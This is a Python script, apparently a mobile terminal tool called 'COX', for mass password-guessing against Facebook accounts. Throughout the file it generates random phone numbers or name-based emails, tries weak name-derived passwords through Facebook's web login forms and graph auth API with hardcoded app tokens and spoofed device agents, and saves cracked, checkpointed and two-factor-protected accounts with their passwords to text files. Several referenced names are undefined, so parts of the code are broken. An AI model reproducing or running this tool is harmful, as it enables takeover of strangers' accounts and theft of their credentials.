import os
import requests,random,sys,json,os,re
from time import sleep as slp
from os import system as cmd
from datetime import datetime
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
import requests, os, re, bs4, uuid, sys, json, time, random, datetime, subprocess
from rich import print as mr_javed_Iqbal_sad_boy
import os,sys,time,json,random,re,string,platform,base64
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as Mr_javed_iqbal_sad_boy
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python BXB.py')
try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] request modules installing...')
    os.system('pip install requests')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] beautiful soup4 modules installing...')
    os.system('pip install bs4')

try:
    import requests
except ImportError:
    print('\n\x1b[1;92m [×] rich modules installing...')
    os.system('pip install rich')

try:
	os.mkdir('/sdcard/BXB_ID')
except:
	pass
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
data,data2={},{}
Apk,ok,cp,id,user = [],[],[],[],[]
loop = 0
javed = []
minx = ' ------------------------------'
sagent=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	sagent.append(xd)


BXB="""
       .o88b.  .d88b.  db    db 
      d8P  Y8 .8P  Y8. `8b  d8' 
      8P      88    88  `8bd8'  
      8b      88    88  .dPYb.  
      Y8b  d8 `8b  d8' .8P  Y8. 
       `Y88P'  `Y88P'  YP    YP                           
----------------------------------------------
 Author    :  THE CROWN
 Github    : MR-CROWN
 Tool Name : COX
 Type type : FREE
 Version   : NONE
----------------------------------------------
 Don't fight the problem, decide it
\033[1;37m----------------------------------------------"""
cod,cod1,cod2,oO = [],[],[],[]
loop = 0
methods,crack_mode,geo,tf = [],[],[],[]

def main():
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] clone from file')
    mr_javed_Iqbal_sad_boy(' [2] clone random gmail+number')
    mr_javed_Iqbal_sad_boy(' [3] file creating and cute etc Menu')
    mr_javed_Iqbal_sad_boy(' [0] exit-program')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put:  ')
    if opt =='1':
    	os.system('clear')
    	print(BXB)
    	file_crack()
    elif opt =='2':
    	os.system('clear')
    	print(BXB);random_crack()
    elif opt =='3':
        os.system('python dump.py')
    elif opt =='0':
        exit("\033[1;92m[+] Good bye")
    else:
        mr_javed_Iqbal_sad_boy('\n Choose valid option ... ');os.system ("clear")
        main()
def random_crack():
    global ok,cp,tf
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Random Number')
    mr_javed_Iqbal_sad_boy(' [2] Random Email ')
    mr_javed_Iqbal_sad_boy(' [0] main-menu')
    mr_javed_Iqbal_sad_boy(minx)
    opt = input(' [+] put: ')   
    if opt =='1':
        os.system('clear && rm -rf .rn.txt')
        print(BXB)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' [+] any country code without + ')
        mr_javed_Iqbal_sad_boy(minx)
        code = input(' [+] put code: ')
        os.system('clear')
        print(BXB)
        for xd in range(5000):
            no = ''.join(random.choice(string.digits) for _ in range(7))
            open('.rn.txt', 'a').write(code+no+'|'+no+'\n')
        fo = open('.rn.txt','r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' [+] Total ids: '+total_ids)            
            mr_javed_Iqbal_sad_boy(' [+] Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,ps = user.split('|')
                passlist = [ps,'khan123','khan1234','khan12345','khan786']
                crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='2':
        os.system('clear && rm -rf .re.txt')
        print(BXB)
        first = input(' [+] put first name: ')
        os.system('clear')
        print(BXB)
        last = input(' [+] put last name: ')
        os.system('clear')
        print(BXB)
        domain = input('\n [+] put domain: ')
        os.system('clear')
        print(BXB)
        lists = ['3','4']
        for xd in range(4999):
            lchoice = random.choice(lists)
            if '3' in lchoice:
                mail = ''.join(random.choice(string.digits) for _ in range(3))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
            else:
                mail = ''.join(random.choice(string.digits) for _ in range(4))
                open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
        xd_ps=input('  Do you want additional passwords (y/n) ? ')
        fo = open('.re.txt', 'r').read().splitlines()
        with Mr_javed_iqbal_sad_boy(max_workers=30) as crack_submit:
            total_ids = str(len(fo))
            os.system('clear')
            print(BXB)
            mr_javed_Iqbal_sad_boy(minx)
            mr_javed_Iqbal_sad_boy(' Total ids: '+total_ids)
            mr_javed_Iqbal_sad_boy(' Use flight mode for speed')
            mr_javed_Iqbal_sad_boy(minx)
            for user in fo:
                ids,name = user.split('|')
                first_name = name.rsplit(' ')[0]
                try:
                    last_name = name.rsplit(' ')[1]
                except IndexError:
                    last_name = 'Khan'
                fs = first_name.lower()
                ls = last_name.lower()
                if xd_ps =='n':
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
                else:
                    passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'1234',fs+'12345',fs+'786',fs+'12',fs+'1122']
                    crack_submit.submit(random_method,ids,passlist,total_ids)
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' The process has completed')
        mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
        input('\n Press enter to back ')
        main()
    elif opt =='0':
        main()
    else:
        mr_javed_Iqbal_sad_boy('please put correct adress... ')
        time.sleep(1)
        random_crack()

def file_crack():
    global ok,cp,tf
    os.system('clear')
    print(BXB)
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' [1] Method ')
    mr_javed_Iqbal_sad_boy(' [2] Method ')
    mr_javed_Iqbal_sad_boy(' [3] Method ')
    mr_javed_Iqbal_sad_boy(' [4] Method ')
    mr_javed_Iqbal_sad_boy(minx)
    opt_method = input(' [+] put method: ')
    os.system('clear')
    print(BXB)
    file = input(' [+] put file path: ')
    try:
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        mr_javed_Iqbal_sad_boy(' No file found on provided path ...')
        time.sleep(1)
        file_crack()
    plist = []
    try:
        ps_limit = int(input('\nhow many password do you want to add? '))
    except:
        ps_limit =1
    print(f'\033[1;32m exp: first last,firtslast,first123')
    for i in range(ps_limit):
        plist.append(input(f' Put password {i+1}: '))     
    with Mr_javed_iqbal_sad_boy(max_workers=25) as crack_submit:
        os.system('clear')
        print(BXB)
        total_ids = str(len(fo))
        mr_javed_Iqbal_sad_boy(minx)
        mr_javed_Iqbal_sad_boy(' total ids: '+total_ids)
        mr_javed_Iqbal_sad_boy(' use flight mode for speed')
        mr_javed_Iqbal_sad_boy(minx)
        for user in fo:
            ids,names = user.split('|')
            passlist = plist
            if opt_method =='1':
                crack_submit.submit(method1,ids,names,passlist,total_ids)
            elif opt_method =='2':
                crack_submit.submit(method2,ids,names,passlist,total_ids)
            elif opt_method =='3':
                crack_submit.submit(method3,ids,names,passlist,total_ids)
            elif opt_method =='4':
                crack_submit.submit(method4,ids,names,passlist,total_ids)
            else:
                mr_javed_Iqbal_sad_boy(' something wrong in methods ');exit()
    mr_javed_Iqbal_sad_boy(minx)
    mr_javed_Iqbal_sad_boy(' The process has completed')
    mr_javed_Iqbal_sad_boy(' Total OK/CP/2F: '+str(len(ok))+'/'+str(len(cp))+'/'+str(len(tf)))
    input('\n Press enter to back ')
    main()
def method1(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M1| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': 'Mozilla/5.0 (Linux; Android 12; Pixel 6 Build/SD1A.210817.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36'}
            req1 = r.get(url1,headers=hed1)
            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),
            'uid' : ids,
            'pass' : pas,
            'next' : f'https://mbasic.facebook.com/login/save-device/',
            'flow' : 'login_no_pin','submit' : 'Log In'}
            url2 = f'https://x.facebook.com/login/device-based/validate-password/?shbl=0'
            hed2 = {'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': 'Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210805.001.A1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.159 Mobile Safari/537.36'}
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[COX-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[COX-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[COX-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
def method2(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M2| %s |OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            nip=random.choice(prox)
            ua = random.choice(sagent)
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            url1 = f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr'
            hed1 = {'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'}
            req1 = r.get(url1,headers=hed1)
            data = {'lsd' : re.search('name="lsd" value="(.*?)"',str(req1.text)).group(1),'jazoest' : re.search('name="jazoest" value="(.*?)"',str(req1.text)).group(1),
            'uid' : ids,
            'pass' : pas,
            'next' : f'https://mbasic.facebook.com/login/save-device/',
            'flow' : 'login_no_pin','submit' : 'Log In'}
            url2 = f'https://d.facebook.com/login/device-based/validate-password/?shbl=0'
            hed2 =  {'accept':'text/html,application/xhtml+xml,application/xml;q-0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;vb3;q=0.9',
    'accept-encoding':'gzip, deflate, br',
    'accept-language':'en-GB, en-US;q=0.9,en;q=0.8',
    'cache-control':'max-age=0',
    'content-length':'171',
    'content-type':'application/x-www-form-urlencoded',
    'sec-ch-ua':'"Chromium"; v="105", "Not)A; Brand"; v="8"',
    'sec-ch-ua-mobile':'?1',
    'sec-ch-ua-platform':'"Windows"',
    'sec-fetch-dest':'document',
    'sec-fetch-mode':'navigate',
    'sec-fetch-site':'same-origin',
    'sec-fetch-user':'?1',
    'cache-control':'private, no-cache, no-store, must-revalidate',
    'pragma':'no-cache',
    'priority':'u=0',
    'upgrade-insecure-requests':'1',
			'user-agent':'Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36'}
            next = r.post(url2,data=data,headers=hed2,allow_redirects = False).text
            cookies = r.cookies.get_dict().keys()
            if 'c_user' in cookies:
                print('\r\r\033[1;32m[COX-OK] '+ids+' | '+pas+'\033[1;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',next,re.IGNORECASE)
                if 'Enter login code to continue' in str(d):
                    print('\r\r\033[1;35m[COX-2F] '+ids+' | '+pas+'\033[1;97m')
                    tf.append(ids)
                    open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    print('\r\r\033[1;31m[COX-CP] '+ids+' | '+pas+'\033[1;97m')
                    cp.append(ids)
                    open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
        loop+=1
    except Exception as e:
        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [COX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(f' ')[0]
                        try:
                                ln = names.split(f' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace(f'first',fn.lower()).replace(f'First',fn).replace(f'last',ln.lower()).replace(f'Last',ln).replace(f'Name',names).replace(f'name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [COX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Queen -OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [COX-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/Queen -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/Queen -CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
def method4(ids,names,passlist,total_ids):
    global loop,ok,cp,tf,ua_opera
    sys.stdout.write('\r M4| %s | OK:%s '%(loop,len(ok)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = 'Khan'
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            r = requests.Session()
            data={"adid": str(uuid.uuid4()),
            "format": "json",
            "device_id": str(uuid.uuid4()),
            "cpl": "true",
            "family_device_id": str(uuid.uuid4()),
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email":ids,
            "password":pas,
            "access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28",
            "generate_session_cookies":"1",
            "meta_inf_fbmeta": "",
            "advertiser_id": str(uuid.uuid4()),
            "currently_logged_in_userid": "0",
            "locale": "en_US",
            "client_country_code": "US",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"}
            post = r.post("https://graph.facebook.com/auth/login",data=data)
            q = json.loads(post.text)
            if 'access_token' in q:
                print('\033[1;32m[COX-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('ok.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'two_factor' in str(q):
                print('\033[1;35m[COX-2F] '+ids+' | '+pas+'\033[0;97m')
                tf.append(ids)
                open('2f.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'temporarily unavailable' in str(q):
                print('\033[1;31m[COX-CP] '+ids+' | '+pas+'\033[0;97m')
                cp.append(ids)
                open('cp.txt', 'a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
    except Exception as e:
        pass
def apix(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write(f'\r\r\033[1;37m [COX] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                xxxxx=(f"GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'Davik/2.1.0 (linex; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {"adid": "9e0f3002-43fc-4358-89f1-5622b403d502",
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source":"device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_CU","client_country_code":"CU",
                                        'device':gtt,
                                        "device_id":"6e18861e-d578-4cfb-8728-528f1e4b90e7",
                                        "method":"auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'User-Agent': 'Dalvik/2.1.0 Linux; U; Android 6.0.0; GT-I9300I Build/KTU84P) [FBAN/FB4A;FBAV/540.0.0.84.626;FBBV/169717250;FBDM/{density=4.0,width=1532,height=2560};FBLC/en_US;FBCR/Grameenphone;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9300I;FBSV/6.0.0;FBCA/armeabi-v7a:armeabi;]',
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'EXCELLENT',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'Liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print(f'\r\r\033[1;32m [COX-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/Queen -OK.txt','a').write(ids+'|'+pas+'\n')
                                        #cek_apk(session,coki)
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r\x1b[38;5;126m [COX-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open(f'/sdcard/Queen -CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open(f'/sdcard/Queen -CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass
        
os.system('clear');main()
